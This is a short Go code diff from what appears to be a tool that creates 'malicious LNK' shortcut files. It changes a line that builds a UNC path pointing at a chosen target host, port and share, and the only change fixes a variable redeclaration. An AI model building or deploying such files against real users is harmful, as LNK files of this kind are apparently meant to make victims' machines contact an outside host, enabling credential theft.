@@ -20,7 +20,7 @@ func CreateLNK(target string, output string, description string, port string, sh
 
 	fmt.Printf("[+] Preparing your malicious LNK file...\n\n")
 	
-	target := "\\\\" + target + "@" + port + "\\" + share
+	target = "\\\\" + target + "@" + port + "\\" + share
 
 	// Record the start time
 	LNKCreationStartTime := time.Now()
